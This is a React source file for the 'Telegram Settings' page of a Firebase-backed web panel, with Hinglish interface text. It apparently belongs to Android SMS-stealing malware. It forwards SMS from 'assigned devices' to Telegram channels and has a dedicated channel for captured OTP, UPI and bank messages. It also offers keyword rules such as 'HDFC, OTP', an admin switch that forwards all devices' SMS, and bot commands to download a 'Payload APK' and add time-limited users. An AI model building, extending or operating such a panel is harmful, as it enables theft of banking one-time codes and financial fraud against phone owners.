import { useState, useEffect } from 'react';
import { db } from '@/lib/firebase';
import { ref, onValue, set, remove } from 'firebase/database';
import { Layout } from '@/components/layout';
import { useAuth } from '@/lib/auth';
import { useToast } from '@/hooks/use-toast';
import {
  Send, Bell, Hash, CheckCircle, XCircle, Loader2,
  Plus, Trash2, AlertCircle, Shield, Settings,
  MessageSquare, ChevronRight, IndianRupee, BellOff, BellRing
} from 'lucide-react';

const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, '');

async function apiFetch(path: string, opts?: RequestInit) {
  const res = await fetch(`${API_BASE}/api${path}`, opts);
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || 'Request failed');
  return data;
}

interface NotifyRule {
  keyword: string;
  channel: string;
}

export function TelegramSettings() {
  const { isAdmin, userId } = useAuth();
  const { toast } = useToast();

  // Global SMS channel (admin only)
  const [globalChannel, setGlobalChannel] = useState('');
  const [savedGlobalChannel, setSavedGlobalChannel] = useState('');
  const [savingGlobal, setSavingGlobal] = useState(false);

  // Per-user personal channel
  const [personalChannel, setPersonalChannel] = useState('');
  const [savedPersonalChannel, setSavedPersonalChannel] = useState('');
  const [savingPersonal, setSavingPersonal] = useState(false);

  // Finance alert channel (forward only financial SMS)
  const [financeChannel, setFinanceChannel] = useState('');
  const [savedFinanceChannel, setSavedFinanceChannel] = useState('');
  const [savingFinance, setSavingFinance] = useState(false);

  // Keyword alert rules (forward SMS matching keyword → channel)
  const [rules, setRules] = useState<NotifyRule[]>([]);
  const [newKeyword, setNewKeyword] = useState('');
  const [newChannel, setNewChannel] = useState('');
  const [addingRule, setAddingRule] = useState(false);

  // Bot info
  const [botUsername, setBotUsername] = useState<string | null>(null);

  useEffect(() => {
    // Load global SMS channel (admin)
    const globalRef = ref(db, 'config/smsChannel');
    const unsub1 = onValue(globalRef, (snap) => {
      const v = snap.val() || '';
      setSavedGlobalChannel(v);
      setGlobalChannel(v);
    });

    // Load user personal channel
    if (userId) {
      const personalRef = ref(db, `config/userChannels/${userId}/sms`);
      const unsub2 = onValue(personalRef, (snap) => {
        const v = snap.val() || '';
        setSavedPersonalChannel(v);
        setPersonalChannel(v);
      });

      const financeRef = ref(db, `config/userChannels/${userId}/finance`);
      const unsub3 = onValue(financeRef, (snap) => {
        const v = snap.val() || '';
        setSavedFinanceChannel(v);
        setFinanceChannel(v);
      });

      // Keyword alert rules
      const rulesRef = ref(db, `config/userChannels/${userId}/rules`);
      const unsub4 = onValue(rulesRef, (snap) => {
        if (snap.exists()) {
          const data = snap.val() as Record<string, NotifyRule>;
          setRules(Object.values(data));
        } else {
          setRules([]);
        }
      });

      return () => { unsub1(); unsub2(); unsub3(); unsub4(); };
    }
    return () => unsub1();
  }, [userId]);

  const saveGlobalChannel = async () => {
    setSavingGlobal(true);
    try {
      await apiFetch('/auth/set-channel', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegramId: userId, channelId: globalChannel.trim() || null }),
      });
      toast({ title: globalChannel.trim() ? '✅ Global Channel Set' : '✅ Global Channel Removed' });
    } catch (err: any) {
      toast({ title: 'Error', description: err.message, variant: 'destructive' });
    } finally {
      setSavingGlobal(false);
    }
  };

  const savePersonalChannel = async () => {
    if (!userId) return;
    setSavingPersonal(true);
    try {
      if (personalChannel.trim()) {
        await set(ref(db, `config/userChannels/${userId}/sms`), personalChannel.trim());
      } else {
        await remove(ref(db, `config/userChannels/${userId}/sms`));
      }
      toast({ title: personalChannel.trim() ? '✅ Personal Channel Set' : '✅ Personal Channel Removed' });
    } catch (err: any) {
      toast({ title: 'Error', description: err.message, variant: 'destructive' });
    } finally {
      setSavingPersonal(false);
    }
  };

  const saveFinanceChannel = async () => {
    if (!userId) return;
    setSavingFinance(true);
    try {
      if (financeChannel.trim()) {
        await set(ref(db, `config/userChannels/${userId}/finance`), financeChannel.trim());
      } else {
        await remove(ref(db, `config/userChannels/${userId}/finance`));
      }
      toast({ title: financeChannel.trim() ? '✅ Finance Channel Set' : '✅ Removed' });
    } catch (err: any) {
      toast({ title: 'Error', description: err.message, variant: 'destructive' });
    } finally {
      setSavingFinance(false);
    }
  };

  const addRule = async () => {
    if (!newKeyword.trim() || !newChannel.trim() || !userId) return;
    setAddingRule(true);
    try {
      const key = newKeyword.trim().toLowerCase().replace(/\s+/g, '_');
      await set(ref(db, `config/userChannels/${userId}/rules/${key}`), {
        keyword: newKeyword.trim(),
        channel: newChannel.trim(),
      });
      setNewKeyword('');
      setNewChannel('');
      toast({ title: '✅ Rule Added' });
    } catch (err: any) {
      toast({ title: 'Error', description: err.message, variant: 'destructive' });
    } finally {
      setAddingRule(false);
    }
  };

  const removeRule = async (keyword: string) => {
    if (!userId) return;
    const key = keyword.toLowerCase().replace(/\s+/g, '_');
    await remove(ref(db, `config/userChannels/${userId}/rules/${key}`));
    toast({ title: 'Rule removed' });
  };

  const Card = ({ children, className = '' }: { children: React.ReactNode; className?: string }) => (
    <div className={`bg-[#ecdbfd] border border-[#d8c8f0] rounded-3xl overflow-hidden ${className}`}>
      <div className="h-1 w-full bg-[#7c3aed]" />
      <div className="p-5">{children}</div>
    </div>
  );

  const SectionTitle = ({ icon: Icon, title, sub }: { icon: any; title: string; sub?: string }) => (
    <div className="mb-4">
      <h2 className="text-xs font-bold uppercase tracking-widest text-[#6b5b7d] flex items-center gap-2">
        <Icon className="w-3.5 h-3.5" /> {title}
      </h2>
      {sub && <p className="text-xs text-[#6b5b7d] mt-1">{sub}</p>}
    </div>
  );

  const ChannelInput = ({
    value, onChange, onSave, saving, placeholder = '-100xxxxxxxxxx', label, helpText
  }: {
    value: string; onChange: (v: string) => void; onSave: () => void;
    saving: boolean; placeholder?: string; label: string; helpText?: string;
  }) => (
    <div className="space-y-2">
      <label className="text-[10px] font-bold uppercase tracking-wider text-[#6b5b7d] block">{label}</label>
      <div className="flex gap-2">
        <input
          type="text"
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder={placeholder}
          className="flex-1 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2.5 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all font-mono"
        />
        <button
          onClick={onSave}
          disabled={saving}
          className="flex items-center gap-2 bg-[#7c3aed] text-white px-5 py-2.5 rounded-full font-semibold text-sm hover:bg-[#6d28d9] disabled:opacity-50 transition-colors shadow-md shadow-purple-200 whitespace-nowrap"
        >
          {saving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
          {saving ? 'Saving...' : value.trim() ? 'Set' : 'Remove'}
        </button>
      </div>
      {helpText && <p className="text-[10px] text-[#6b5b7d]">{helpText}</p>}
    </div>
  );

  return (
    <Layout>
      <div className="max-w-3xl mx-auto space-y-6">
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-[#2d1b4e] flex items-center gap-2">
            <Send className="w-6 h-6 text-[#7c3aed]" />
            Telegram Settings
          </h1>
          <p className="text-[#6b5b7d] text-sm mt-1">Configure notification channels and alert rules</p>
        </div>

        {/* Setup guide */}
        <div className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-4 text-sm text-[#6b5b7d] space-y-1">
          <p className="font-semibold text-[#2d1b4e] flex items-center gap-1.5">
            <AlertCircle className="w-4 h-4 text-[#7c3aed]" /> Setup Guide
          </p>
          <p>1. Telegram channel/group banao</p>
          <p>2. Bot ko admin banao (message send permission)</p>
          <p>3. Channel ID yahan paste karo (e.g. <code className="text-[#7c3aed] text-xs">-100xxxxxxxxxx</code>)</p>
          <p>4. Bot se <code className="text-[#7c3aed] text-xs">/setchannel</code> command bhi use kar sakte ho</p>
        </div>

        {/* Personal SMS Channel */}
        <Card>
          <SectionTitle
            icon={MessageSquare}
            title="My SMS Channel"
            sub="Apne assigned devices ke SMS is channel pe forward honge (sirf aapke devices)"
          />
          {savedPersonalChannel && (
            <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
              <CheckCircle className="w-4 h-4 text-[#10b981]" />
              <span className="text-[#2d1b4e]">Active: <code className="text-[#7c3aed] font-mono">{savedPersonalChannel}</code></span>
            </div>
          )}
          <ChannelInput
            value={personalChannel}
            onChange={setPersonalChannel}
            onSave={savePersonalChannel}
            saving={savingPersonal}
            label="Channel ID"
            helpText="Sirf is account se assigned devices ke SMS yahan ayenge"
          />
        </Card>

        {/* Finance Alert Channel */}
        <Card>
          <SectionTitle
            icon={IndianRupee}
            title="Finance Alert Channel"
            sub="Sirf financial SMS (OTP, UPI, debit, credit, bank) is channel pe forward honge"
          />
          {savedFinanceChannel && (
            <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
              <CheckCircle className="w-4 h-4 text-[#10b981]" />
              <span className="text-[#2d1b4e]">Active: <code className="text-[#7c3aed] font-mono">{savedFinanceChannel}</code></span>
            </div>
          )}
          <ChannelInput
            value={financeChannel}
            onChange={setFinanceChannel}
            onSave={saveFinanceChannel}
            saving={savingFinance}
            label="Finance Channel ID"
            helpText="OTP, UPI payment, bank transaction SMS automatically detect hokar yahan jayenge"
          />
        </Card>

        {/* Keyword Alert Rules */}
        <Card>
          <SectionTitle
            icon={Bell}
            title="Keyword Alert Rules"
            sub="Jab kisi SMS mein specific keyword mile, us SMS ko specific channel pe forward karo"
          />

          {rules.length > 0 && (
            <div className="space-y-2 mb-4">
              {rules.map((rule) => (
                <div key={rule.keyword} className="flex items-center justify-between bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-4 py-2.5">
                  <div className="flex items-center gap-3 min-w-0">
                    <span className="bg-[#ecdbfd] text-[#7c3aed] text-xs font-bold px-2.5 py-1 rounded-full flex-shrink-0">
                      {rule.keyword}
                    </span>
                    <ChevronRight className="w-3.5 h-3.5 text-[#6b5b7d] flex-shrink-0" />
                    <code className="text-xs text-[#2d1b4e] font-mono truncate">{rule.channel}</code>
                  </div>
                  <button
                    onClick={() => removeRule(rule.keyword)}
                    className="ml-3 p-1.5 rounded-xl hover:bg-red-50 hover:text-[#ef4444] text-[#6b5b7d] transition-colors flex-shrink-0"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>
              ))}
            </div>
          )}

          <div className="flex gap-2 flex-wrap sm:flex-nowrap">
            <input
              type="text"
              value={newKeyword}
              onChange={(e) => setNewKeyword(e.target.value)}
              placeholder="Keyword (e.g. HDFC, OTP)"
              className="flex-1 min-w-0 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2.5 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all"
            />
            <input
              type="text"
              value={newChannel}
              onChange={(e) => setNewChannel(e.target.value)}
              placeholder="Channel ID"
              className="flex-1 min-w-0 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl px-3 py-2.5 text-sm text-[#2d1b4e] focus:outline-none focus:border-[#7c3aed] transition-all font-mono"
            />
            <button
              onClick={addRule}
              disabled={addingRule || !newKeyword.trim() || !newChannel.trim()}
              className="flex items-center gap-2 bg-[#7c3aed] text-white px-4 py-2.5 rounded-full font-semibold text-sm hover:bg-[#6d28d9] disabled:opacity-50 transition-colors shadow-md shadow-purple-200 whitespace-nowrap"
            >
              {addingRule ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}
              Add Rule
            </button>
          </div>
        </Card>

        {/* Global SMS Channel — Admin Only */}
        {isAdmin && (
          <Card>
            <SectionTitle
              icon={Shield}
              title="Global SMS Channel (Admin)"
              sub="ALL devices ke SMS is channel pe forward honge — admin-level setting"
            />
            {savedGlobalChannel ? (
              <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
                <BellRing className="w-4 h-4 text-[#10b981]" />
                <span className="text-[#2d1b4e]">Active: <code className="text-[#7c3aed] font-mono">{savedGlobalChannel}</code></span>
              </div>
            ) : (
              <div className="mb-3 bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-2.5 flex items-center gap-2 text-sm text-[#6b5b7d]">
                <BellOff className="w-4 h-4" /> Global forwarding is currently off
              </div>
            )}
            <ChannelInput
              value={globalChannel}
              onChange={setGlobalChannel}
              onSave={saveGlobalChannel}
              saving={savingGlobal}
              label="Global Channel ID"
              helpText="Sabhi users ke sabhi devices ke SMS yahan forward honge"
            />
          </Card>
        )}

        {/* Bot Commands Reference */}
        <Card>
          <SectionTitle icon={Settings} title="Bot Commands Reference" />
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
            {[
              { cmd: '/setchannel -100xxx', desc: 'Global SMS channel set karo' },
              { cmd: '/removechannel', desc: 'Global channel hata do' },
              { cmd: '/apk', desc: 'Payload APK download karo' },
              { cmd: '/reset_password', desc: 'Panel password reset karo' },
              { cmd: '/stats', desc: 'Bot + device stats dekho' },
              { cmd: '/adduser ID days email pass', desc: 'New user add karo (admin)' },
            ].map(({ cmd, desc }) => (
              <div key={cmd} className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                <p className="text-[#6b5b7d] text-xs mb-1">{desc}</p>
                <code className="text-[#7c3aed] font-mono text-xs">{cmd}</code>
              </div>
            ))}
          </div>
        </Card>
      </div>
    </Layout>
  );
}
